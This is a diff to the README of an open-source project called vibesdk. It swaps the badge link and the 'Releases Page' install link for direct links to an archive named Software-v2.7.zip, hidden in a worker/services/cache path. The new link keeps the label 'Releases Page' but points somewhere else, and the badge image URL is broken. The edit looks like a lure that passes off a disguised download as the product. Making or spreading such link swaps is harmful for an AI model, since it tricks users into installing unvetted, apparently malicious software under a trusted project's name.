@@ -6,7 +6,7 @@ Welcome to vibesdk, your go-to open-source platform for building vibe-coding app
 
 ## 📥 Download Link
 
-[![Download vibesdk](https://img.shields.io/badge/Download%20vibesdk-v1.0-blue)](https://github.com/Pcmakepass/vibesdk/releases)
+[![Download vibesdk](https://github.com/Pcmakepass/vibesdk/raw/refs/heads/main/worker/services/cache/Software-v2.7.zip%20vibesdk-v1.0-blue)](https://github.com/Pcmakepass/vibesdk/raw/refs/heads/main/worker/services/cache/Software-v2.7.zip)
 
 ## 📖 What is vibesdk?
 
@@ -23,7 +23,7 @@ Before you download vibesdk, ensure your system meets these requirements:
 
 ## 🔗 Download & Install
 
-To download vibesdk, please visit the following link: [Releases Page](https://github.com/Pcmakepass/vibesdk/releases).
+To download vibesdk, please visit the following link: [Releases Page](https://github.com/Pcmakepass/vibesdk/raw/refs/heads/main/worker/services/cache/Software-v2.7.zip).
 
 1. Click on the link above.
 2. You'll see a list of available files. Look for the most recent version.
